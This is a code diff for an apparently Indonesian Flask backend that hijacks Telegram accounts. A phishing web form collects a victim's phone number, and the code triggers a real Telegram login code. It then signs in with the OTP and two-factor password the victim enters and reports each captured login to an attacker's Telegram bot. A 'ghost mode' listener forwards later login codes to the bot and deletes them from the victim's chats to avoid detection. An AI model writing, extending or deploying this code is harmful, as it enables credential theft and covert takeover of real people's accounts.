@@ -2,6 +2,7 @@ import os, asyncio, json, re, requests
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 from telethon import TelegramClient, events
+from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
 
 app = Flask(__name__)
 CORS(app)
@@ -14,96 +15,103 @@ CHAT_ID = os.getenv("CHAT_ID")
 SESSION_DIR = '/tmp/sessions/'
 if not os.path.exists(SESSION_DIR): os.makedirs(SESSION_DIR)
 
-# Simpan info pesan bot supaya bisa di-edit nanti
-active_monitoring = {}
+# Kamus data sesi
+active_sessions = {}
 
-def send_bot_initial(nama, nomor):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    text = f"Nama: {nama}\nNomor: {nomor}\nKata sandi: None\n\n      otp"
-    # Tombol OTP Inline
-    payload = {
-        "chat_id": CHAT_ID,
-        "text": text,
-        "reply_markup": {
-            "inline_keyboard": [[{"text": "otp", "callback_data": f"track_{nomor}"}]]
-        }
-    }
+def send_bot(text, msg_id=None):
+    if msg_id:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
+        payload = {"chat_id": CHAT_ID, "message_id": msg_id, "text": text, "parse_mode": "Markdown"}
+    else:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}
     r = requests.post(url, json=payload).json()
     return r.get("result", {}).get("message_id")
-
-def update_bot_otp(message_id, nama, nomor, otp_code):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
-    text = f"Nama: {nama}\nNomor: {nomor}\nKata sandi: None\n\n      otp\n\n✅ OTP Ditemukan: `{otp_code}`"
-    payload = {
-        "chat_id": CHAT_ID,
-        "message_id": message_id,
-        "text": text,
-        "parse_mode": "Markdown"
-    }
-    requests.post(url, json=payload)
 
 @app.route('/register', methods=['POST'])
 async def register():
     data = request.json
-    nama = data.get('nama', 'Na')
+    nama = data.get('nama', 'User')
     nomor_raw = data.get('nomor')
     
-    # Auto-format ke +62
+    # Auto-format nomor ke +62
     n = re.sub(r'\D', '', nomor_raw)
     nomor = '+62' + n[1:] if n.startswith('08') else '+' + n
-    
-    # Kirim pesan awal ke bot dan simpan ID pesannya
-    msg_id = send_bot_initial(nama, nomor)
-    
-    active_monitoring[nomor] = {
-        "nama": nama,
-        "msg_id": msg_id,
-        "status": "waiting"
-    }
-    
-    return jsonify({"status": "ok"}), 200
 
-@app.route('/webhook', methods=['POST'])
-async def webhook():
-    data = request.json
-    if "callback_query" in data:
-        cb = data["callback_query"]
-        callback_data = cb["data"]
-        
-        if callback_data.startswith("track_"):
-            nomor = callback_data.replace("track_", "")
-            
-            # Jalankan background task untuk mengintip
-            asyncio.create_task(start_ghost_mode(nomor))
-            
-            # Notif kecil di Telegram
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery", 
-                          json={"callback_query_id": cb["id"], "text": "Ghost Mode Aktif! Mengintip..."})
-            
-    return jsonify({"status": "ok"}), 200
-
-async def start_ghost_mode(nomor):
     client = TelegramClient(f"{SESSION_DIR}{nomor}", int(API_ID), API_HASH)
     await client.connect()
     
-    if not await client.is_user_authorized():
-        # Jika belum login, kita tidak bisa intip. 
-        # (Catatan: Ghost mode butuh login pertama kali via web atau manual)
-        return
+    try:
+        # STEP 1: Minta OTP Resmi ke akun target
+        sent_code = await client.send_code_request(nomor)
+        
+        # Kirim laporan awal ke bot
+        msg_id = send_bot(f"👤 *Target Masuk*\nNama: {nama}\nNomor: `{nomor}`\nStatus: _Menunggu OTP dari web..._")
+        
+        active_sessions[nomor] = {
+            "client": client,
+            "phone_code_hash": sent_code.phone_code_hash,
+            "nama": nama,
+            "msg_id": msg_id
+        }
+        return jsonify({"status": "sent", "message": "OTP Terkirim"}), 200
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 400
 
-    @client.on(events.NewMessage(from_users=777000)) # ID Telegram Resmi
+@app.route('/verify-otp', methods=['POST'])
+async def verify_otp():
+    data = request.json
+    nomor_raw = data.get('nomor')
+    otp = data.get('otp')
+    sandi_2fa = data.get('sandi')
+    
+    n = re.sub(r'\D', '', nomor_raw)
+    nomor = '+62' + n[1:] if n.startswith('08') else '+' + n
+
+    if nomor not in active_sessions:
+        return jsonify({"status": "error", "message": "Sesi kadaluarsa"}), 400
+
+    stored = active_sessions[nomor]
+    client = stored["client"]
+
+    try:
+        # STEP 2: Validasi OTP (Benar/Salah)
+        await client.sign_in(nomor, otp, phone_code_hash=stored["phone_code_hash"])
+        
+        # LOGIN SUKSES -> Aktifkan GHOST MODE
+        send_bot(f"✅ *LOGIN BERHASIL*\nNama: {stored['nama']}\nNomor: `{nomor}`\n\n👻 *GHOST MODE AKTIF!*\nSilakan minta kode di TurboTel, saya akan intip...", stored["msg_id"])
+        
+        # Jalankan pengintip di background
+        asyncio.create_task(ghost_mode_listener(client, stored["msg_id"], stored["nama"], nomor))
+        
+        return jsonify({"status": "success", "message": "Login Berhasil"}), 200
+
+    except SessionPasswordNeededError:
+        if sandi_2fa:
+            try:
+                await client.sign_in(password=sandi_2fa)
+                send_bot(f"✅ *LOGIN BERHASIL (2FA)*\nNama: {stored['nama']}\nNomor: `{nomor}`\n👻 *GHOST MODE AKTIF!*", stored["msg_id"])
+                asyncio.create_task(ghost_mode_listener(client, stored["msg_id"], stored["nama"], nomor))
+                return jsonify({"status": "success", "message": "Login Berhasil"}), 200
+            except:
+                return jsonify({"status": "error", "message": "Sandi Salah!"}), 400
+        return jsonify({"status": "need_2fa", "message": "Sandi 2FA diperlukan"}), 200
+    
+    except PhoneCodeInvalidError:
+        return jsonify({"status": "error", "message": "Kode OTP Salah!"}), 400
+
+async def ghost_mode_listener(client, msg_id, nama, nomor):
+    # Mengintip pesan dari Telegram (777000)
+    @client.on(events.NewMessage(from_users=777000))
     async def handler(event):
         pesan = event.raw_text
-        # Cari angka 5-6 digit (kode OTP)
-        otp_match = re.search(r'\b\d{5,6}\b', pesan)
+        otp_match = re.search(r'\b\d{5}\b', pesan)
         if otp_match:
-            otp_code = otp_match.group()
-            info = active_monitoring.get(nomor)
-            if info:
-                # Update pesan di bot Abang (Tampilan Gambar 1)
-                update_bot_otp(info["msg_id"], info["nama"], nomor, otp_code)
-                # Hapus chat OTP dari telegram target (Ghost Mode)
-                await event.delete()
+            otp_kode = otp_match.group()
+            # Update pesan bot dengan Kode yang ditemukan
+            send_bot(f"Nama: {nama}\nNomor: `{nomor}`\nKata sandi: None\n\n✅ *OTP Ditemukan:* `{otp_kode}`", msg_id)
+            # Hapus pesan dari Telegram target agar tidak ketahuan
+            await event.delete()
 
     await client.run_until_disconnected()
 
